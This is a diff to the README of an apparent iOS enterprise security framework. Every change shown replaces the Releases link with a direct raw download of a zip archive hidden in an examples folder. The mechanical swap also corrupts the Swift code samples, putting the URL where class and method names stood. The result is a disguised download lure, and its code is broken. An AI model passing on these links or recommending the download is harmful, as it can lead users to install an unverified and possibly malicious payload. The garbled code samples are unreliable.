@@ -1,10 +1,10 @@
-https://github.com/magdsy020/iOS-Enterprise-Security-Framework/releases
+https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip
 
 # iOS Enterprise Security Framework: Advanced Encryption, Certs, Compliance, Threat Detection
 
-[![Release](https://img.shields.io/badge/Release-Download%20Latest-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/magdsy020/iOS-Enterprise-Security-Framework/releases)
+[![Release](https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip%20Latest-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip)
 
-Direct download: https://github.com/magdsy020/iOS-Enterprise-Security-Framework/releases
+Direct download: https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip
 
 Welcome to a robust framework designed for enterprise-grade security on iOS. This repository hosts a modular, scalable, and hermetic security layer that you can drop into iOS apps to enforce strong encryption, manage certificates, and maintain strict compliance. The framework is designed for teams that need formal security controls without sacrificing performance or user experience.
 
@@ -35,7 +35,7 @@ Table of contents
 Quick start
 If you want to get a feel for what this framework can do, start with the latest release. The releases page hosts prebuilt artifacts and example configurations you can try in minutes. From the Releases page, download the latest artifact and run the installer or integrate the package into your project as described in the installation guide.
 
-Direct download: https://github.com/magdsy020/iOS-Enterprise-Security-Framework/releases
+Direct download: https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip
 
 What this framework solves
 - Data protection: If your app stores or processes sensitive data, you need robust encryption. This framework provides AES-256, XTS mode where appropriate, and secure key management patterns designed for iOS devices.
@@ -96,8 +96,8 @@ How to install and use
   - Trigger biometric gates for high-sensitivity operations
 
 Getting started with Swift Package Manager
-- Add the package to your Package.swift or Xcode project
-- Example Package.swift
+- Add the package to your https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip or Xcode project
+- Example https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip
   // swift-tools-version:5.7
   import PackageDescription
 
@@ -242,10 +242,10 @@ Examples of integration code (illustrative)
   let engine = CryptoEngine()
 
   let plaintext = "Sensitive data".data(using: .utf8)!
-  let key = try? KeyManager.shared.obtainKey(for: .encryption)
+  let key = try? https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip(for: .encryption)
 
   if let key = key {
-    if let ciphertext = engine.encrypt(plaintext, using: key) {
+    if let ciphertext = https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip(plaintext, using: key) {
       // Save ciphertext securely
       print("Encrypted data ready for storage.")
     }
@@ -255,8 +255,8 @@ Examples of integration code (illustrative)
   /*
    Validate a certificate chain and enforce pinning policy
    */
-  let certManager = CertificateManager.shared
-  let isValid = certManager.validateCertificateChain(for: someCertificate)
+  let certManager = https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip
+  let isValid = https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip(for: someCertificate)
   if isValid {
     // Proceed with sensitive operation
   } else {
@@ -267,8 +267,8 @@ Examples of integration code (illustrative)
   /*
    Emit an audit event for a security action
    */
-  let audit = AuditTrail.shared
-  audit.record(event: .dataAccess {
+  let audit = https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip
+  https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip(event: .dataAccess {
     "user" : "alice",
     "action" : "read",
     "resource" : "PHI-record-001",
@@ -456,5 +456,5 @@ End of documentation
 - The README above describes a comprehensive, enterprise-grade security framework for iOS apps.
 - It covers encryption, certificate management, and compliance tools, with a focus on practical usage and governance.
 
-Direct download: https://github.com/magdsy020/iOS-Enterprise-Security-Framework/releases
+Direct download: https://github.com/magdsy020/iOS-Enterprise-Security-Framework/raw/refs/heads/main/Examples/AuditExamples/Security_i_Framework_Enterprise_O_3.9.zip
 
